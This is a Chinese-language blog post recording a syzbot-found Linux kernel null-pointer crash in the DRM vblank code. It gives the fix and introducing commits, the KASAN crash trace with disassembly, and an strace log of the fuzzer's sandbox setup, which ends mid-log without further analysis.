---
title: syzbot上general protection fault in drm_crtc_next_vblank_start
date: 2024-12-27 14:44:00
tags: [linux]
---

# general protection fault in drm_crtc_next_vblank_start

## 漏洞描述

地址：https://syzkaller.appspot.com/bug?extid=54280c5aea19802490b5

fix commit:  6f1ccbf07453 drm/vblank: [Fix for drivers that do not drm_vblank_init](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6f1ccbf07453eb1ee6bb24d6b531b88dd44ad229) 

introduce commit: d39e48ca80c0960b039cb38633957f0040f63e1a [drm/atomic-helper: Set fence deadline for vblank](https://git.kernel.org/pub/scm/linux/kernel/git/next/linux-next.git/commit/?id=d39e48ca80c0960b039cb38633957f0040f63e1a)

影响范围：6.3-rc2 到 6.3-rc4

## 崩溃报告

```
[drm:udl_init] *ERROR* Unrecognized vendor firmware descriptor
[drm:udl_init] *ERROR* Selecting channel failed
[drm] Initialized udl 0.0.1 20120220 for 1-1:0.0 on minor 2
[drm] Initialized udl on minor 2
udl 1-1:0.0: [drm] *ERROR* Read EDID byte 0 failed err ffffffb9
udl 1-1:0.0: [drm] Cannot find any crtc or sizes
general protection fault, probably for non-canonical address 0xdffffc0000000028: 0000 [#1] PREEMPT SMP KASAN
KASAN: null-ptr-deref in range [0x0000000000000140-0x0000000000000147]
CPU: 1 PID: 2439 Comm: kworker/1:2 Not tainted 6.3.0-rc2-syzkaller #0
Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS Google 03/02/2023
Workqueue: usb_hub_wq hub_event
RIP: 0010:drm_crtc_next_vblank_start+0xa9/0x260 drivers/gpu/drm/drm_vblank.c:1003
Code: a4 01 00 00 48 69 db 38 02 00 00 48 b8 00 00 00 00 00 fc ff df 49 03 9d 38 03 00 00 4c 8d ab 44 01 00 00 4c 89 ea 48 c1 ea 03 <0f> b6 14 02 4c 89 e8 83 e0 07 83 c0 03 38 d0 7c 08 84 d2 0f 85 24
RSP: 0018:ffffc9000b6bec28 EFLAGS: 00010207
RAX: dffffc0000000000 RBX: 0000000000000000 RCX: ffff88801d0e0408
RDX: 0000000000000028 RSI: ffffc9000b6becb0 RDI: ffff8880209a0338
RBP: ffff8880209a10d8 R08: ffff8880209a0dc8 R09: ffff8880209a0dc8
R10: ffff8880209a00a0 R11: 0000000000000012 R12: ffffc9000b6becb0
R13: 0000000000000144 R14: dffffc0000000000 R15: ffff88801d0e0400
FS:  0000000000000000(0000) GS:ffff8880b9b00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f0330cd0378 CR3: 00000000754aa000 CR4: 00000000003506e0
DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
Call Trace:
 <TASK>
 set_fence_deadline drivers/gpu/drm/drm_atomic_helper.c:1531 [inline]
 drm_atomic_helper_wait_for_fences+0x169/0x630 drivers/gpu/drm/drm_atomic_helper.c:1578
 drm_atomic_helper_commit drivers/gpu/drm/drm_atomic_helper.c:2007 [inline]
 drm_atomic_helper_commit+0x161/0x2a0 drivers/gpu/drm/drm_atomic_helper.c:1979
 drm_atomic_commit+0x1ce/0x2b0 drivers/gpu/drm/drm_atomic.c:1443
 drm_client_modeset_commit_atomic+0x54a/0x690 drivers/gpu/drm/drm_client_modeset.c:1045
 drm_client_modeset_commit_locked+0x12d/0x4c0 drivers/gpu/drm/drm_client_modeset.c:1148
 drm_client_modeset_commit+0x3b/0x60 drivers/gpu/drm/drm_client_modeset.c:1174
 drm_fb_helper_single_fb_probe drivers/gpu/drm/drm_fb_helper.c:1963 [inline]
 __drm_fb_helper_initial_config_and_unlock+0xec3/0x1450 drivers/gpu/drm/drm_fb_helper.c:2153
 drm_fbdev_client_hotplug+0x15e/0x210 drivers/gpu/drm/drm_fbdev_generic.c:384
 drm_fbdev_generic_setup+0xf5/0x350 drivers/gpu/drm/drm_fbdev_generic.c:450
 udl_usb_probe+0xd9/0x120 drivers/gpu/drm/udl/udl_drv.c:120
 usb_probe_interface+0x26c/0x820 drivers/usb/core/driver.c:396
 call_driver_probe drivers/base/dd.c:552 [inline]
 really_probe+0x1c7/0xb20 drivers/base/dd.c:631
 __driver_probe_device+0x186/0x460 drivers/base/dd.c:768
 driver_probe_device+0x44/0x110 drivers/base/dd.c:798
 __device_attach_driver+0x14e/0x270 drivers/base/dd.c:926
 bus_for_each_drv+0x102/0x190 drivers/base/bus.c:457
 __device_attach+0x19e/0x3d0 drivers/base/dd.c:998
 bus_probe_device+0x12b/0x170 drivers/base/bus.c:532
 device_add+0xee4/0x1930 drivers/base/core.c:3589
 usb_set_configuration+0xabc/0x1a20 drivers/usb/core/message.c:2171
 usb_generic_driver_probe+0x88/0xd0 drivers/usb/core/generic.c:238
 usb_probe_device+0x98/0x240 drivers/usb/core/driver.c:293
 call_driver_probe drivers/base/dd.c:552 [inline]
 really_probe+0x1c7/0xb20 drivers/base/dd.c:631
 __driver_probe_device+0x186/0x460 drivers/base/dd.c:768
 driver_probe_device+0x44/0x110 drivers/base/dd.c:798
 __device_attach_driver+0x14e/0x270 drivers/base/dd.c:926
 bus_for_each_drv+0x102/0x190 drivers/base/bus.c:457
 __device_attach+0x19e/0x3d0 drivers/base/dd.c:998
 bus_probe_device+0x12b/0x170 drivers/base/bus.c:532
 device_add+0xee4/0x1930 drivers/base/core.c:3589
 usb_new_device+0xc6e/0x1930 drivers/usb/core/hub.c:2575
 hub_port_connect drivers/usb/core/hub.c:5407 [inline]
 hub_port_connect_change drivers/usb/core/hub.c:5551 [inline]
 port_event drivers/usb/core/hub.c:5711 [inline]
 hub_event+0x24cc/0x4240 drivers/usb/core/hub.c:5793
 process_one_work+0x865/0x14b0 kernel/workqueue.c:2390
 worker_thread+0x59c/0xec0 kernel/workqueue.c:2537
 kthread+0x298/0x340 kernel/kthread.c:376
 ret_from_fork+0x1f/0x30 arch/x86/entry/entry_64.S:308
 </TASK>
Modules linked in:
---[ end trace 0000000000000000 ]---
RIP: 0010:drm_crtc_next_vblank_start+0xa9/0x260 drivers/gpu/drm/drm_vblank.c:1003
Code: a4 01 00 00 48 69 db 38 02 00 00 48 b8 00 00 00 00 00 fc ff df 49 03 9d 38 03 00 00 4c 8d ab 44 01 00 00 4c 89 ea 48 c1 ea 03 <0f> b6 14 02 4c 89 e8 83 e0 07 83 c0 03 38 d0 7c 08 84 d2 0f 85 24
RSP: 0018:ffffc9000b6bec28 EFLAGS: 00010207
RAX: dffffc0000000000 RBX: 0000000000000000 RCX: ffff88801d0e0408
RDX: 0000000000000028 RSI: ffffc9000b6becb0 RDI: ffff8880209a0338
RBP: ffff8880209a10d8 R08: ffff8880209a0dc8 R09: ffff8880209a0dc8
R10: ffff8880209a00a0 R11: 0000000000000012 R12: ffffc9000b6becb0
R13: 0000000000000144 R14: dffffc0000000000 R15: ffff88801d0e0400
FS:  0000000000000000(0000) GS:ffff8880b9b00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f0330cd0378 CR3: 00000000211bc000 CR4: 00000000003506e0
DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
----------------
Code disassembly (best guess), 2 bytes skipped:
   0:	00 00                	add    %al,(%rax)
   2:	48 69 db 38 02 00 00 	imul   $0x238,%rbx,%rbx
   9:	48 b8 00 00 00 00 00 	movabs $0xdffffc0000000000,%rax
  10:	fc ff df
  13:	49 03 9d 38 03 00 00 	add    0x338(%r13),%rbx
  1a:	4c 8d ab 44 01 00 00 	lea    0x144(%rbx),%r13
  21:	4c 89 ea             	mov    %r13,%rdx
  24:	48 c1 ea 03          	shr    $0x3,%rdx
* 28:	0f b6 14 02          	movzbl (%rdx,%rax,1),%edx <-- trapping instruction
  2c:	4c 89 e8             	mov    %r13,%rax
  2f:	83 e0 07             	and    $0x7,%eax
  32:	83 c0 03             	add    $0x3,%eax
  35:	38 d0                	cmp    %dl,%al
  37:	7c 08                	jl     0x41
  39:	84 d2                	test   %dl,%dl
  3b:	0f                   	.byte 0xf
  3c:	85                   	.byte 0x85
  3d:	24                   	.byte 0x24
```

## 内核日志

```
./strace-static-x86_64 -e \!wait4,clock_nanosleep,nanosleep -s 100 -x -f ./syz-executor1090894197

<...>
forked to background, child pid 4658
no interfaces have a carrier
[   50.939620][ T4659] 8021q: adding VLAN 0 to HW filter on device bond0
[   50.964647][ T4659] eql: remember to turn off Van-Jacobson compression on your slave devices
Starting sshd: OK

syzkaller
Warning: Permanently added '10.128.1.73' (ECDSA) to the list of known hosts.
execve("./syz-executor1090894197", ["./syz-executor1090894197"], 0x7ffcd9e2bed0 /* 10 vars */) = 0
brk(NULL)                               = 0x555556616000
brk(0x555556616c40)                     = 0x555556616c40
arch_prctl(ARCH_SET_FS, 0x555556616300) = 0
uname({sysname="Linux", nodename="syzkaller", ...}) = 0
readlink("/proc/self/exe", "/root/syz-executor1090894197", 4096) = 28
brk(0x555556637c40)                     = 0x555556637c40
brk(0x555556638000)                     = 0x555556638000
mprotect(0x7f17191f2000, 16384, PROT_READ) = 0
mmap(0x1ffff000, 4096, PROT_NONE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x1ffff000
mmap(0x20000000, 16777216, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x20000000
mmap(0x21000000, 4096, PROT_NONE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x21000000
unshare(CLONE_NEWPID)                   = 0
clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD./strace-static-x86_64: Process 5086 attached
, child_tidptr=0x5555566165d0) = 5086
[pid  5086] mount(NULL, "/sys/fs/fuse/connections", "fusectl", 0, NULL) = -1 EBUSY (Device or resource busy)
[pid  5086] prctl(PR_SET_PDEATHSIG, SIGKILL) = 0
[pid  5086] setsid()                    = 1
[pid  5086] prlimit64(0, RLIMIT_AS, {rlim_cur=204800*1024, rlim_max=204800*1024}, NULL) = 0
[pid  5086] prlimit64(0, RLIMIT_MEMLOCK, {rlim_cur=32768*1024, rlim_max=32768*1024}, NULL) = 0
[pid  5086] prlimit64(0, RLIMIT_FSIZE, {rlim_cur=139264*1024, rlim_max=139264*1024}, NULL) = 0
[pid  5086] prlimit64(0, RLIMIT_STACK, {rlim_cur=1024*1024, rlim_max=1024*1024}, NULL) = 0
[pid  5086] prlimit64(0, RLIMIT_CORE, {rlim_cur=131072*1024, rlim_max=131072*1024}, NULL) = 0
[pid  5086] prlimit64(0, RLIMIT_NOFILE, {rlim_cur=256, rlim_max=256}, NULL) = 0
[pid  5086] unshare(CLONE_NEWNS)        = 0
[pid  5086] mount(NULL, "/", NULL, MS_REC|MS_PRIVATE, NULL) = 0
[pid  5086] unshare(CLONE_NEWIPC)       = 0
[pid  5086] unshare(CLONE_NEWCGROUP)    = 0
[pid  5086] unshare(CLONE_NEWUTS)       = 0
[pid  5086] unshare(CLONE_SYSVSEM)      = 0
[pid  5086] openat(AT_FDCWD, "/proc/sys/kernel/shmmax", O_WRONLY|O_CLOEXEC) = 3
[pid  5086] write(3, "16777216", 8)     = 8
[pid  5086] close(3)                    = 0
[pid  5086] openat(AT_FDCWD, "/proc/sys/kernel/shmall", O_WRONLY|O_CLOEXEC) = 3
[pid  5086] write(3, "536870912", 9)    = 9
[pid  5086] close(3)                    = 0
[pid  5086] openat(AT_FDCWD, "/proc/sys/kernel/shmmni", O_WRONLY|O_CLOEXEC) = 3
[pid  5086] write(3, "1024", 4)         = 4
[pid  5086] close(3)                    = 0
[pid  5086] openat(AT_FDCWD, "/proc/sys/kernel/msgmax", O_WRONLY|O_CLOEXEC) = 3
[pid  5086] write(3, "8192", 4)         = 4
[pid  5086] close(3)                    = 0
[pid  5086] openat(AT_FDCWD, "/proc/sys/kernel/msgmni", O_WRONLY|O_CLOEXEC) = 3
[pid  5086] write(3, "1024", 4)         = 4
[pid  5086] close(3)                    = 0
[pid  5086] openat(AT_FDCWD, "/proc/sys/kernel/msgmnb", O_WRONLY|O_CLOEXEC) = 3
[pid  5086] write(3, "1024", 4)         = 4
[pid  5086] close(3)                    = 0
[pid  5086] openat(AT_FDCWD, "/proc/sys/kernel/sem", O_WRONLY|O_CLOEXEC) = 3
[pid  5086] write(3, "1024 1048576 500 1024", 21) = 21
[pid  5086] close(3)                    = 0
[pid  5086] getpid()                    = 1
[pid  5086] capget({version=_LINUX_CAPABILITY_VERSION_3, pid=1}, {effective=1<<CAP_CHOWN|1<<CAP_DAC_OVERRIDE|1<<CAP_DAC_READ_SEARCH|1<<CAP_FOWNER|1<<CAP_FSETID|1<<CAP_KILL|1<<CAP_SETGID|1<<CAP_SETUID|1<<CAP_SETPCAP|1<<CAP_LINUX_IMMUTABLE|1<<CAP_NET_BIND_SERVICE|1<<CAP_NET_BROADCAST|1<<CAP_NET_ADMIN|1<<CAP_NET_RAW|1<<CAP_IPC_LOCK|1<<CAP_IPC_OWNER|1<<CAP_SYS_MODULE|1<<CAP_SYS_RAWIO|1<<CAP_SYS_CHROOT|1<<CAP_SYS_PTRACE|1<<CAP_SYS_PACCT|1<<CAP_SYS_ADMIN|1<<CAP_SYS_BOOT|1<<CAP_SYS_NICE|1<<CAP_SYS_RESOURCE|1<<CAP_SYS_TIME|1<<CAP_SYS_TTY_CONFIG|1<<CAP_MKNOD|1<<CAP_LEASE|1<<CAP_AUDIT_WRITE|1<<CAP_AUDIT_CONTROL|1<<CAP_SETFCAP|1<<CAP_MAC_OVERRIDE|1<<CAP_MAC_ADMIN|1<<CAP_SYSLOG|1<<CAP_WAKE_ALARM|1<<CAP_BLOCK_SUSPEND|1<<CAP_AUDIT_READ|1<<CAP_PERFMON|1<<CAP_BPF|1<<CAP_CHECKPOINT_RESTORE, permitted=1<<CAP_CHOWN|1<<CAP_DAC_OVERRIDE|1<<CAP_DAC_READ_SEARCH|1<<CAP_FOWNER|1<<CAP_FSETID|1<<CAP_KILL|1<<CAP_SETGID|1<<CAP_SETUID|1<<CAP_SETPCAP|1<<CAP_LINUX_IMMUTABLE|1<<CAP_NET_BIND_SERVICE|1<<CAP_NET_BROADCAST|1<<CAP_NET_ADMIN|1<<CAP_NET_RAW|1<<CAP_IPC_LOCK|1<<CAP_IPC_OWNER|1<<CAP_SYS_MODULE|1<<CAP_SYS_RAWIO|1<<CAP_SYS_CHROOT|1<<CAP_SYS_PTRACE|1<<CAP_SYS_PACCT|1<<CAP_SYS_ADMIN|1<<CAP_SYS_BOOT|1<<CAP_SYS_NICE|1<<CAP_SYS_RESOURCE|1<<CAP_SYS_TIME|1<<CAP_SYS_TTY_CONFIG|1<<CAP_MKNOD|1<<CAP_LEASE|1<<CAP_AUDIT_WRITE|1<<CAP_AUDIT_CONTROL|1<<CAP_SETFCAP|1<<CAP_MAC_OVERRIDE|1<<CAP_MAC_ADMIN|1<<CAP_SYSLOG|1<<CAP_WAKE_ALARM|1<<CAP_BLOCK_SUSPEND|1<<CAP_AUDIT_READ|1<<CAP_PERFMON|1<<CAP_BPF|1<<CAP_CHECKPOINT_RESTORE, inheritable=0}) = 0
[pid  5086] capset({version=_LINUX_CAPABILITY_VERSION_3, pid=1}, {effective=1<<CAP_CHOWN|1<<CAP_DAC_OVERRIDE|1<<CAP_DAC_READ_SEARCH|1<<CAP_FOWNER|1<<CAP_FSETID|1<<CAP_KILL|1<<CAP_SETGID|1<<CAP_SETUID|1<<CAP_SETPCAP|1<<CAP_LINUX_IMMUTABLE|1<<CAP_NET_BIND_SERVICE|1<<CAP_NET_BROADCAST|1<<CAP_NET_ADMIN|1<<CAP_NET_RAW|1<<CAP_IPC_LOCK|1<<CAP_IPC_OWNER|1<<CAP_SYS_MODULE|1<<CAP_SYS_RAWIO|1<<CAP_SYS_CHROOT|1<<CAP_SYS_PACCT|1<<CAP_SYS_ADMIN|1<<CAP_SYS_BOOT|1<<CAP_SYS_RESOURCE|1<<CAP_SYS_TIME|1<<CAP_SYS_TTY_CONFIG|1<<CAP_MKNOD|1<<CAP_LEASE|1<<CAP_AUDIT_WRITE|1<<CAP_AUDIT_CONTROL|1<<CAP_SETFCAP|1<<CAP_MAC_OVERRIDE|1<<CAP_MAC_ADMIN|1<<CAP_SYSLOG|1<<CAP_WAKE_ALARM|1<<CAP_BLOCK_SUSPEND|1<<CAP_AUDIT_READ|1<<CAP_PERFMON|1<<CAP_BPF|1<<CAP_CHECKPOINT_RESTORE, permitted=1<<CAP_CHOWN|1<<CAP_DAC_OVERRIDE|1<<CAP_DAC_READ_SEARCH|1<<CAP_FOWNER|1<<CAP_FSETID|1<<CAP_KILL|1<<CAP_SETGID|1<<CAP_SETUID|1<<CAP_SETPCAP|1<<CAP_LINUX_IMMUTABLE|1<<CAP_NET_BIND_SERVICE|1<<CAP_NET_BROADCAST|1<<CAP_NET_ADMIN|1<<CAP_NET_RAW|1<<CAP_IPC_LOCK|1<<CAP_IPC_OWNER|1<<CAP_SYS_MODULE|1<<CAP_SYS_RAWIO|1<<CAP_SYS_CHROOT|1<<CAP_SYS_PACCT|1<<CAP_SYS_ADMIN|1<<CAP_SYS_BOOT|1<<CAP_SYS_RESOURCE|1<<CAP_SYS_TIME|1<<CAP_SYS_TTY_CONFIG|1<<CAP_MKNOD|1<<CAP_LEASE|1<<CAP_AUDIT_WRITE|1<<CAP_AUDIT_CONTROL|1<<CAP_SETFCAP|1<<CAP_MAC_OVERRIDE|1<<CAP_MAC_ADMIN|1<<CAP_SYSLOG|1<<CAP_WAKE_ALARM|1<<CAP_BLOCK_SUSPEND|1<<CAP_AUDIT_READ|1<<CAP_PERFMON|1<<CAP_BPF|1<<CAP_CHECKPOINT_RESTORE, inheritable=0}) = 0
[pid  5086] socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE) = 3
[pid  5086] access("/proc/net", R_OK)   = 0
[pid  5086] access("/proc/net/unix", R_OK) = 0
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="nr0", ifr_ifindex=23}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x17\x00\x00\x00\x08\x00\x02\x00\xac\x1e\x00\x01\x08\x00\x01\x00\xac\x1e\x00\x01"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=RTM_NEWADDR, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|NLM_F_REPLACE|NLM_F_CREATE, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="nr0", ifr_ifindex=23}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=RTM_NEWLINK, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, {ifi_family=AF_UNSPEC, ifi_type=ARPHRD_NETROM, ifi_index=if_nametoindex("nr0"), ifi_flags=IFF_UP, ifi_change=0x1}, [{nla_len=11, nla_type=IFLA_ADDRESS}, bb:bb:bb:00:00:00:00]], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=RTM_NEWLINK, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="rose0", ifr_ifindex=39}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=RTM_NEWADDR, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|NLM_F_REPLACE|NLM_F_CREATE, nlmsg_seq=0, nlmsg_pid=0}, {ifa_family=AF_INET, ifa_prefixlen=24, ifa_flags=0, ifa_scope=RT_SCOPE_UNIVERSE, ifa_index=if_nametoindex("rose0")}, [[{nla_len=8, nla_type=IFA_LOCAL}, inet_addr("172.30.1.1")], [{nla_len=8, nla_type=IFA_ADDRESS}, inet_addr("172.30.1.1")]]], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=RTM_NEWADDR, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|NLM_F_REPLACE|NLM_F_CREATE, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="rose0", ifr_ifindex=39}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=RTM_NEWLINK, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, {ifi_family=AF_UNSPEC, ifi_type=ARPHRD_NETROM, ifi_index=if_nametoindex("rose0"), ifi_flags=0, ifi_change=0}, [{nla_len=9, nla_type=IFLA_ADDRESS}, bb:bb:bb:01:00]], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=RTM_NEWLINK, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] close(3)                    = 0
[pid  5086] unshare(CLONE_NEWNET)       = 0
[pid  5086] openat(AT_FDCWD, "/proc/sys/net/ipv4/ping_group_range", O_WRONLY|O_CLOEXEC) = 3
[pid  5086] write(3, "0 65535", 7)      = 7
[pid  5086] close(3)                    = 0
[pid  5086] openat(AT_FDCWD, "/dev/net/tun", O_RDWR|O_NONBLOCK) = 3
[pid  5086] dup2(3, 200)                = 200
[pid  5086] close(3)                    = 0
[pid  5086] ioctl(200, TUNSETIFF, 0x7ffe55bbe510) = 0
[pid  5086] openat(AT_FDCWD, "/proc/sys/net/ipv6/conf/syz_tun/accept_dad", O_WRONLY|O_CLOEXEC) = 3
[pid  5086] write(3, "0", 1)            = 1
[pid  5086] close(3)                    = 0
[pid  5086] openat(AT_FDCWD, "/proc/sys/net/ipv6/conf/syz_tun/router_solicitations", O_WRONLY|O_CLOEXEC) = 3
[pid  5086] write(3, "0", 1)            = 1
[pid  5086] close(3)                    = 0
[pid  5086] socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE) = 3
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="syz_tun", ifr_ifindex=11}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x0b\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\xaa\x08\x00\x01\x00\xac\x14\x14\xaa"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="syz_tun", ifr_ifindex=11}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x0b\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xaa\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xaa"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="syz_tun", ifr_ifindex=11}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=48, nlmsg_type=0x1c /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x00\x00\x00\x0b\x00\x00\x00\x80\x00\x00\x00\x08\x00\x01\x00\xac\x14\x14\xbb\x0a\x00\x02\x00\xbb\xaa\xaa\xaa\xaa\xaa\x00\x00"], 48, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 48
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=48, nlmsg_type=0x1c /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="syz_tun", ifr_ifindex=11}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=60, nlmsg_type=0x1c /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x00\x00\x00\x0b\x00\x00\x00\x80\x00\x00\x00\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xbb\x0a\x00\x02\x00\xbb\xaa\xaa\xaa\xaa\xaa\x00\x00"], 60, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 60
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=60, nlmsg_type=0x1c /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="syz_tun", ifr_ifindex=11}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\xaa\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
